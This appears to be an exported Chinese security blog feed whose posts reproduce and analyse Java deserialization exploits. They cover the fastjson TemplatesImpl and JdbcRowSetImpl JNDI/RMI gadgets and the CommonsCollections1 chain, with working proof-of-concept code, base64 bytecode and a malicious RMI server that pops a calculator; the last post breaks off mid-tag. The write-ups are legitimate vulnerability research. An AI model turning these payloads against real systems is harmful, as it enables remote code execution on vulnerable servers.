&#39;&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;%s&quot;],&quot;_name&quot;:&quot;a.b&quot;,&quot;_tfactory&quot;:&#123;&#125;,&quot;_outputProperties&quot;:&#123; &#125;,&quot;_version&quot;:&quot;1.0&quot;,&quot;allowedProtocols&quot;:&quot;all&quot;&#125;&#39;% foutprint poc</code></pre><pre><code class="java">import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.Feature;public class POC &#123;    public static void main(String[] args) &#123;        String jsonstr = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQALVEVNUE9DLmphdmEMAAgACQcAIQwAIgAjAQAIY2FsYy5leGUMACQAJQEAFFRlbXBsYXRlc0ltcGwvVEVNUE9DAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAAAuAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAEACwAAAA4AAwAAAA0ABAAOAA0ADwAMAAAABAABAA0AAQAOAA8AAQAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAABMAAQAOABAAAgAKAAAAGQAAAAMAAAABsQAAAAEACwAAAAYAAQAAABgADAAAAAQAAQARAAkAEgATAAIACgAAACUAAgACAAAACbsABVm3AAZMsQAAAAEACwAAAAoAAgAAABsACAAcAAwAAAAEAAEAFAABABUAAAACABY=\&quot;],\&quot;_name\&quot;:\&quot;a.b\&quot;,\&quot;_tfactory\&quot;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,\&quot;_version\&quot;:\&quot;1.0\&quot;,\&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;&quot;;        JSON.parseObject(jsonstr, Feature.SupportNonPublicField);    &#125;&#125;</code></pre><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gocqv1b1ujj30tq0hswg9.jpg" alt=""></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul><li>@type：用于识别需要反序列化的类，这里需要识别的是templatetestlmpl，因为调用了getOutputProperties方法，实例化bytecodes进行命令执行。但是由于outputProperties和bytecodes是由private修饰，所以这里要添加Feature.SupportNonPublicField参数。</li><li>_bytecodes:继承AbstractTranslet，且有base64加密过的字节码。</li><li>_name:会对此进行判断如果为null则无法触发。</li><li>_tfactory: 和name相同</li><li>_outputProperties:触发漏洞的关键参数。</li></ul><p>我们和上一篇文章一样，先从后面的链进行分析。</p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gocq363zocj30em04mjrk.jpg" alt=""><br>在getOutputProperties函数中，调用了newTeansformer函数，我们跟入：<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gocq50xol4j30os0a1jsb.jpg" alt=""><br>跟入getTransformerImpl函数<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gocqb1berjj30wp0lzacp.jpg" alt=""><br>在函数中，先判断了_name是否为null，然后调用defineTransletClasses，其中调用了defineClass,defineClass主要的功能就是将字节码转换成class。</p><pre><code class="java">protected final Class&lt;?&gt; defineClass(String name, byte[] b, int off, int len)    throws ClassFormatError&#123;    return defineClass(name, b, off, len, null);&#125;</code></pre><p>最后newInstance将恶意类进行实例化进行命令执行。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gocrc1po6yj30sp05ygmi.jpg" alt=""><br>下面是前面的分析，因为上一篇文章讲过的原因，这里就简单讲一下重要的地方，这里先将key和默认值进行比对，并且没有打开Feature.DisableSpecialKeyDetect,这个打开会进行关键字检测。然后通过loadclass加载templateslpml<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gocrhzitt1j314l05zaar.jpg" alt=""><br>getDeserializer会获取对应类的反序列化器JavaBeanDeserializer<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gocrw3m3glj30ji085gm4.jpg" alt=""><br>JavaBeanDeserializer会根据偏移量获取到下一个key值_bytecodes<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gocrxixz8ej311a05v74s.jpg" alt=""><br>然后经过parseField获取value并设置到object中，<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gocrxixz8ej311a05v74s.jpg" alt=""><br>在parseField中跟入<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gocsl27q1tj316b034dg2.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gocsliy3alj30hi03vjrk.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gocslpt8xrj319703h74p.jpg" alt=""><br>可以看见这里进行了base64解码这就是为什么bytecodes进行base64加密的原因。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gocsr6gikkj30pz06l0ts.jpg" alt=""><br>我们可以看见这里说fieldinfo一件变成了outputProperties了，这是因为中smartmatch中将_替换成了空。之后会触发setoutputProperties。最后命令执行。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>之后木爷告诉我其实不用将java转成class文件。<br>直接用javasist动态生成字节码就可以了。木爷给的代码：</p><pre><code class="java">import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.Feature;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import javassist.*;import java.util.Base64;public class poc1 &#123;    public static String generateEvil() throws Exception &#123;        ClassPool pool = ClassPool.getDefault();        CtClass clas = pool.makeClass(&quot;Evil&quot;);        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));        String cmd = &quot;Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;;        clas.makeClassInitializer().insertBefore(cmd);        clas.setSuperclass(pool.getCtClass(AbstractTranslet.class.getName()));        clas.writeFile(&quot;./&quot;);        byte[] bytes = clas.toBytecode();        String EvilCode = Base64.getEncoder().encodeToString(bytes);        System.out.println(EvilCode);        return EvilCode;    &#125;    public static void main(String[] args) throws Exception &#123;        final String GADGAT_CLASS = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;        String evil = poc1.generateEvil();        String PoC = &quot;&#123;\&quot;@type\&quot;:\&quot;&quot; + GADGAT_CLASS + &quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot; + evil + &quot;\&quot;],&#39;_name&#39;:&#39;a.b&#39;,&#39;_tfactory&#39;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot; + &quot;\&quot;_name\&quot;:\&quot;a\&quot;,\&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;\n&quot;;        JSON.parseObject(PoC,Object.class, Feature.SupportNonPublicField);    &#125;&#125;</code></pre>]]></content>
    
    <summary type="html">
    
      Java
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
      <category term="java" scheme="http://yoursite.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>fastjson1.2.22-1.2.24漏洞复现与分析</title>
    <link href="http://yoursite.com/2021/03/07/fastjson1.2.22-1.2.24%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2021/03/07/fastjson1.2.22-1.2.24%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/</id>
    <published>2021-03-07T03:12:01.000Z</published>
    <updated>2021-07-29T05:50:48.604Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基于Java反序列化-初识RMI，JRMP，JNDI"><a href="#基于Java反序列化-初识RMI，JRMP，JNDI" class="headerlink" title="基于Java反序列化-初识RMI，JRMP，JNDI"></a>基于Java反序列化-初识RMI，JRMP，JNDI</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>QAQ，感觉自己啥也不会，要好好努力学习了。但是由于本人遗忘度很大，因此要记下来学习QAQ。</p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><h3 id="RMI（Remote-Method-Invocation）"><a href="#RMI（Remote-Method-Invocation）" class="headerlink" title="RMI（Remote Method Invocation）"></a>RMI（Remote Method Invocation）</h3><p>Java远程方法调用，即Java RMI（Java Remote Method Invocation）是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。</p><p>Java RMI极大地依赖于接口。在需要创建一个远程对象的时候，程序员通过传递一个接口来隐藏底层的实现细节。客户端得到的远程对象句柄正好与本地的根代码连接，由后者负责透过网络通信。这样一来，程序员只需关心如何通过自己的接口句柄发送消息。</p><p>乱七八糟的一大串，简单来说，RMI就是一个只java远程调用方法的行为。</p><h3 id="JRMP（Java-Remote-Method-Protocol）"><a href="#JRMP（Java-Remote-Method-Protocol）" class="headerlink" title="JRMP（Java Remote Method Protocol）"></a>JRMP（Java Remote Method Protocol）</h3><p>Java远程方法协议（英语：Java Remote Method Protocol，JRMP）是特定于Java技术的、用于查找和引用远程对象的协议。这是运行在Java远程方法调用（RMI）之下、TCP/IP之上的线路层协议（英语：Wire protocol）。<br>###JNDI（Java Naming and Directory Interface）<br>Java命名和目录接口（Java Naming and Directory Interface，缩写JNDI），是Java的一个目录服务应用程序接口（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。</p><p>就是一个接口，可以通过lookup方法访问其所绑定的对象。</p><h4 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h4><h5 id="程序A"><a href="#程序A" class="headerlink" title="程序A"></a>程序A</h5><p>继承Remote的HelloService接口：</p><pre><code>public interface HelloService extends Remote &#123;    String sayHello() throws RemoteException;&#125;</code></pre><p>HelloService的实现</p><pre><code>public class HelloServiceImpl extends UnicastRemoteObject implements HelloService &#123;    public HelloServiceImpl() throws RemoteException &#123;    &#125;    @Override    public String sayHello() throws RemoteException &#123;        System.out.println(&quot;hello!&quot;);        return &quot;hello!&quot;;    &#125;&#125;</code></pre><p>RMI服务端</p><pre><code>public class RMIServer &#123;    public static void main(String[] args) &#123;        try &#123;            Registry registry = LocateRegistry.createRegistry(1099);            registry.bind(&quot;hello&quot;, new HelloServiceImpl());        &#125; catch (RemoteException e) &#123;            e.printStackTrace();        &#125; catch (AlreadyBoundException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre><h4 id="程序B"><a href="#程序B" class="headerlink" title="程序B"></a>程序B</h4><pre><code>public class RMIClient &#123;    public static void main(String[] args) &#123;        try &#123;            HelloService helloService = (HelloService)LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099).lookup(&quot;hello&quot;);        System.out.println(helloService.sayHello());        &#125; catch (RemoteException e) &#123;            e.printStackTrace();        &#125; catch (NotBoundException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre><p>先执行程序A再执行程序B就会打印hello。</p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1go8nwk0h35j324o0d8wg3.jpg" alt=""><br>程序A启动了一个RMI的注册中心，并把HelloServiceImpl暴露在注册中心中。程序B启动之后通过命名寻找方法，最后通过JRMP协议发起RMI请求，程序A输出hello后将信息序列化发送给程序B，最后程序B反序列化输出。</p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>反序列化有三个函数：</p><pre><code>parse (String text) parseObject(String text)parseObject(String text, Class clazz)</code></pre><pre><code class="java">import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;import java.util.Properties;public class fastjsonTest &#123;    public String t1;    private int t2;    private Boolean t3;    private Properties t4;    private Properties t5;    public String getT1() &#123;        System.out.println(&quot;getT1()&quot;);        return t1;    &#125;    public void setT1(String t1) &#123;        this.t1 = t1;        System.out.println(&quot;setT1()&quot;);    &#125;    public int getT2() &#123;        System.out.println(&quot;getT2&quot;);        return t2;    &#125;    public void setT2(int t2) &#123;        System.out.println(&quot;setT2&quot;);        this.t2 = t2;    &#125;    public Boolean getT3() &#123;        System.out.println(&quot;getT3&quot;);        return t3;    &#125;    public Properties getT4() &#123;        System.out.println(&quot;getT4&quot;);        return t4;    &#125;    public Properties getT5() &#123;        System.out.println(&quot;getT5&quot;);        return t5;    &#125;    public void setT5(Properties t5) &#123;        System.out.println(&quot;setT5&quot;);        this.t5 = t5;    &#125;    @Override    public String toString() &#123;        return &quot;fastjsonTest&#123;&quot; +                &quot;t1=&#39;&quot; + t1 + &#39;\&#39;&#39; +                &quot;, t2=&quot; + t2 +                &quot;, t3=&quot; + t3 +                &quot;, t4=&quot; + t4 +                &quot;, t5=&quot; + t5 +                &#39;&#125;&#39;;    &#125;    public static void main(String[] args) &#123;        String jsonstr = &quot;&#123;\&quot;@type\&quot;:\&quot;fastjsonTest\&quot;,\&quot;t1\&quot;:1,\&quot;t2\&quot;:2,\&quot;t3\&quot;:3,\&quot;t4\&quot;:&#123;&#125;,\&quot;t5\&quot;:&#123;&#125;&#125;&quot;;        Object obj = JSON.parse(jsonstr);//        Object obj = JSON.parseObject(jsonstr,fastjsonTest.class);//        Object obj = JSON.parseObject(jsonstr);        System.out.println(obj);    &#125;&#125;</code></pre><h4 id="Json-parse-jsonstr"><a href="#Json-parse-jsonstr" class="headerlink" title="Json.parse(jsonstr)"></a>Json.parse(jsonstr)</h4><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1go9xgtancaj316w0e2myz.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1go9xlnso5cj318s08mn1g.jpg" alt=""><br>setT1() 、setT2() 、getT4() 、setT5() 被调用</p><p>JSON.parse(jsonstr)最终返回FastJsonTest类的对象</p><h4 id="JSON-parseObject-jsonstr-fastjsonTest-class"><a href="#JSON-parseObject-jsonstr-fastjsonTest-class" class="headerlink" title="JSON.parseObject(jsonstr,fastjsonTest.class)"></a>JSON.parseObject(jsonstr,fastjsonTest.class)</h4><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1go9xs4d6ydj316c0u0te7.jpg" alt=""></p><p>可以看见parseObject(jsonstr,fastjsonTest.class)的输出和parse一样，并且obj的类也相同。</p><h4 id="JSON-parseObject-jsonstr"><a href="#JSON-parseObject-jsonstr" class="headerlink" title="JSON.parseObject(jsonstr)"></a>JSON.parseObject(jsonstr)</h4><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1go9xyxpgctj31f40u0wle.jpg" alt=""></p><p>FastJsonTest类中的所有getter与setter都被调用了，并且JSON.parseObject(jsonstr);返回一个JSONObject对象而且其中的getT4还被调用了两次，这究竟是为什么呢？</p><p>我们先来总结一下：</p><ul><li>parse(String text)，构造方法 + setter + 满足条件额外的getter</li><li>parseObject(String text, Class<T> clazz) ，构造方法 + setter + 满足条件额外的getter</li><li>JSONObject parseObject(String text)，构造方法 + setter + getter + 满足条件额外的getter</li></ul><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>分析这里讲得很清楚了，就不复述了。<a href="http://blog.topsec.com.cn/fastjson-1-2-24%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e6%b7%b1%e5%ba%a6%e5%88%86%e6%9e%90/">http://blog.topsec.com.cn/fastjson-1-2-24%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e6%b7%b1%e5%ba%a6%e5%88%86%e6%9e%90/</a></p><h2 id="JdbcRowsetlmpl"><a href="#JdbcRowsetlmpl" class="headerlink" title="JdbcRowsetlmpl"></a>JdbcRowsetlmpl</h2><h3 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI+RMI"></a>JNDI+RMI</h3><p>因为过程中出现了bug，导致不能远程调用class文件，导致我学了一天才搞懂，虽然过程很自闭，但是还好最后解决了。我们先写一个JNDIserver的代码：</p><pre><code class="java">import com.sun.jndi.rmi.registry.ReferenceWrapper;import javax.naming.NamingException;import javax.naming.Reference;import java.rmi.AlreadyBoundException;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class JNDIServer &#123;    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException, AlreadyBoundException, RemoteException &#123;        Registry registry = LocateRegistry.createRegistry(1099);        System.out.println(&quot;Java RMI created!port:1099&quot;);        Reference reference = new Reference(&quot;exploit&quot;, &quot;badClassName&quot;,&quot;http://127.0.0.1:8000/&quot;);        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);        registry.bind(&quot;exploit&quot;,referenceWrapper);    &#125;&#125;</code></pre><h4 id="JNDIClient"><a href="#JNDIClient" class="headerlink" title="JNDIClient"></a>JNDIClient</h4><pre><code class="java">import com.alibaba.fastjson.JSON;public class JNDIClient &#123;    public static void main(String[] args) &#123;        String PoC = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/exploit\&quot;, \&quot;autoCommit\&quot;:false&#125;&quot;;        JSON.parse(PoC);    &#125;&#125;</code></pre><h4 id="badClassName"><a href="#badClassName" class="headerlink" title="badClassName"></a>badClassName</h4><pre><code class="java">import java.io.IOException;import java.io.Serializable;import java.util.Hashtable;import javax.naming.Context;import javax.naming.Name;import javax.naming.spi.ObjectFactory;public class badClassName implements ObjectFactory, Serializable &#123;    public badClassName() &#123;        try &#123;            Runtime.getRuntime().exec(&quot;calc.exe&quot;);        &#125; catch (IOException var2) &#123;            var2.printStackTrace();        &#125;    &#125;    public Object getObjectInstance(Object var1, Name var2, Context var3, Hashtable&lt;?, ?&gt; var4) throws Exception &#123;        return null;    &#125;    public static void main(String[] var0) &#123;        new badClassName();    &#125;&#125;</code></pre><p>部署过程先运行JNIDServer然后再编译badClassName生成class文件，利用python启动HTTP服务，最后再启动JNDIClient便可以弹出计算器。<br>    python3 -m http.server 8000(这里不写端口号默认为8000)<br>这里如果想要成功复现的话需要如下环境：</p><ul><li>fastjson1.2.22-1.2.24</li><li>JDK&lt;=6u141、7u131、8u121.</li><li>在一些java8的版本也可以添加JVM参数-Dcom.sun.jndi.rmi.object.trustURLCodebase=true</li></ul><p>如果运行完成功弹出计算器，记得看一下http是否被访问，只有被访问，才算成功的复现，如果没访问就弹出计算器是因为在本地加载了class文件。当时为就是一直卡在这里，由于m1的适配问题，为换了一台电脑，但是又因为为Windows的环境问题有一些小bug，不过还好最终解决了。</p><h3 id="具体分析"><a href="#具体分析" class="headerlink" title="具体分析"></a>具体分析</h3><p>我们先逆向的分析，这样个人认为比较容易明白。<br>我们通过对JDNI注入的学习，应该知道JNDI注入是因为lookup的调用，那我们要思考中JdbcRowsetlmpl中哪里触发了lookup函数。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gob4v1hzbsj31fx0qe798.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gob4yvzb48j316s0nxdjm.jpg" alt=""><br>在JdbcRowSetlmpl函数中调用到lookup函数的是connect函数，我们看见lookup的参数是getDataSourceName返回的函数。我们上面总结过中parse中，会调用所有的setter函数，因此datasource是可控的。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gob503ywbej30kn05mt92.jpg" alt=""><br>在setAutoCommit中调用了connect。因此POC遍显而易见了</p><pre><code>&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;rmi://localhost:1099/exploit&quot;, &quot;autoCommit&quot;:false&#125;</code></pre><p>这里先总结一下后面的调用链：</p><pre><code>Lookup:417,InitalContext //jndi lookup函数通过rmi或者ldap获取恶意类connect：624，JdbcRowSetlmpl。//通过connect触发lookupsetAutoCommit:4067,JdbcRowSetImpl //通过setAutoCommit从而在后面触发了connect函数</code></pre><p>我们再转回去看看</p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gob4pcbxrlj30kh04gq35.jpg" alt=""><br>从parse进入，刚开始会调用DefaultJSONParser，这个函数会将token设置为12.<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gob4rukux4j30qk08v0tl.jpg" alt=""><br>然后我们跟进DefaultJSONParser.parser函数中，</p><p>在上面我们说过token被设置为12，因此在这里会跳转到这个位置，<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gob592xkcxj30rj0bgabp.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gob5buoytyj30v1054jsb.jpg" alt=""><br>这里获取key值与@type做对比，然后获取class值。继续跟踪<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gob5dz5cyrj317l0530tf.jpg" alt=""><br>这里调用了getDeserializer生成该类型的反序列化器，但是这里利用了ASM机制动态生成类，但是此类的Java源文件没有，无法进行调试，按照之前的逻辑，在FastjsonASMDeserializer_1_JdbcRowSetImpl中会获取到属性的key值，并通过DefaultFieldDeserializer.parseField方法反序列化属性。<br>我们进入到deserialize中。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gob5kk9cqbj318h05pdgi.jpg" alt=""><br>这里将autoCommit作为key值传入。最后通过setValue触发invoke。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gob5q1xwa1j30g802wwed.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gob5q8g06cj30ms02oq2y.jpg" alt=""><br>后面就是后半段链了。<br>下面是利用链：</p><pre><code>parse#fastjson  paserObject#fastjson   deserialze#JavaBeanDeserializer    parseField#DefaultFieldDeserialzer      setValue#fieldDeserializer    invoke#Method      serAutoCommit#JabcRowSetlmpl       connect#JdbcRowSetlmpl             lookup</code></pre><p>还有一个利用链事LADP+RMI原理差不多，就不写了。</p><h2 id="Tip"><a href="#Tip" class="headerlink" title="Tip"></a>Tip</h2><pre><code>JDK低版本Factory 为类名，且Exploit有完整包名，主要保持二者不一致，否则会直接从本地加载类；</code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>也不知道自己理解的有没有问题，哎，终究是太菜，觉得大佬们都好强。还是要继续努力QAQ。这个月买了想了半个年的macbookpro m1但是也发生了让我很伤心的事。</p><p>你总以为，未来路很长，有无限的可能。却不知道，有些人有些物等不了你。世间好物不坚牢，彩云易散琉璃脆。你只有见过死亡，才能体会生活的真相。</p><p>人生如逆旅，你我皆行人，擦肩而过，就是永远。</p>]]></content>
    
    <summary type="html">
    
      Java
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
      <category term="java" scheme="http://yoursite.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>CommonsCollections 1分析</title>
    <link href="http://yoursite.com/2021/03/03/CommonsCollections%201%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2021/03/03/CommonsCollections%201%E5%88%86%E6%9E%90/</id>
    <published>2021-03-03T12:05:01.000Z</published>
    <updated>2021-07-29T05:50:58.658Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections-1分析"><a href="#CommonsCollections-1分析" class="headerlink" title="CommonsCollections 1分析"></a>CommonsCollections 1分析</h1><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><pre><code>ObjectInputStream.readObject()        AnnotationInvocationHandler.readObject()            Map(Proxy).entrySet()                AnnotationInvocationHandler.invoke()                    LazyMap.get()                        ChainedTransformer.transform()                            ConstantTransformer.transform()                            InvokerTransformer.transform()                                Method.invoke()                                    Class.getMethod()                            InvokerTransformer.transform()                                Method.invoke()                                    Runtime.getRuntime()                            InvokerTransformer.transform()                                Method.invoke()                                    Runtime.exec()</code></pre><p>在CC1的利用中使用的是LazyMap，而在LazyMap中需要用到动态代理。</p><h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>官方文档</p><h3 id="InvocationHandler"><a href="#InvocationHandler" class="headerlink" title="InvocationHandler"></a>InvocationHandler</h3><pre><code>public interface InvocationHandler</code></pre><p>InvocationHandler是由代理实例的调用处理程序实现的接口 。<br>每个代理实例都有一个关联的调用处理程序。 当在代理实例上调用方法时，方法调用将被编码并分派到其调用处理程序的invoke方法。</p><table><thead><tr><th align="left">Modifier and Type</th><th align="left">Method and Description</th></tr></thead><tbody><tr><td align="left">Object</td><td align="left">invoke(Object proxy, 方法 method, Object[] args)处理代理实例上的方法调用并返回结果。</td></tr><tr><td align="left">### Proxy</td><td align="left"></td></tr><tr><td align="left">public class Proxy</td><td align="left"></td></tr><tr><td align="left">extends Object</td><td align="left"></td></tr><tr><td align="left">implements Serializable</td><td align="left"></td></tr><tr><td align="left">Proxy提供了创建动态代理类和实例的静态方法，它也是由这些方法创建的所有动态代理类的超类。</td><td align="left"></td></tr><tr><td align="left">为某个接口创建代理Foo ：</td><td align="left"></td></tr></tbody></table><pre><code>  InvocationHandler handler = new MyInvocationHandler(...);     Class&lt;?&gt; proxyClass = Proxy.getProxyClass(Foo.class.getClassLoader(), Foo.class);     Foo f = (Foo) proxyClass.getConstructor(InvocationHandler.class).                 newInstance(handler); 或更简单地：  Foo f = (Foo) Proxy.newProxyInstance(Foo.class.getClassLoader(),                                      new Class&lt;?&gt;[] &#123; Foo.class &#125;,                                      handler); </code></pre><ul><li>每个代理类有一个公共构造一个参数，该接口的实现InvocationHandler ，设置调用处理程序的代理实例。 而不必使用反射API来访问公共构造函数，也可以通过调用Proxy.newProxyInstance方法来创建代理实例，该方法将调用Proxy.getProxyClass的操作与调用处理程序一起调用构造函数。</li></ul><p>这里来举个例子：<br><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go5jfrbooyj21c00u07fu.jpg" alt=""><br>这里先定义一个handler实现对接口的调用。</p><p>然后再创建一个hello对象，因为所有方法都会委派给invoke，而重写的invoke方法中当使用get方法时会打印Evil。最后在输出中打印Evil。</p><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>在commons collections中有一个Transformer接口，其中包含一个Transfrome方法，我们可以通过此接口来完成cc1的利用。</p><p>在众多的继承中，我们主要利用到三个</p><h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><pre><code>public InvokerTransformer(String methodName,              Class[] paramTypes,              Object[] args)Constructor that performs no validation. Use getInstance if you want that.Parameters:methodName - the method to callparamTypes - the constructor parameter types, not clonedargs - the constructor arguments, not clonedTransforms the input to result by invoking a method on the input.</code></pre><p>这个方法对input进行反射。</p><h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p>其Transformer将输入原封不动的返回。</p><pre><code>public Object transform(Object input)Transforms the input by ignoring it and returning the stored constant instead.Specified by:transform in interface TransformerParameters:input - the input object which is ignoredReturns:the stored constant</code></pre><h3 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h3><p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go6t2i0cudj20z80883zh.jpg" alt=""></p><p>这三个组合起来就可以实现任意执行</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go6ucwghpfj20vz0ek0ua.jpg" alt=""><br>这样就可以弹出计算器了，但是这里反序列化的时候会发生报错。因为Runtime并没有继承Serializable，所以这里会序列化失败。刚刚开始我还傻傻的以为这是不能命令执行，结果我发现我的可以执行（小丑竟是我自己）。</p><p>因此我们要用反射的方式来调用getRuntime这个方法。</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go6vz5c6u9j216e0lyaew.jpg" alt=""></p><p>接下来我们就要思考中cc1中哪里触发了transform方法，这里是LazyMap中的get方法触发</p><p><img 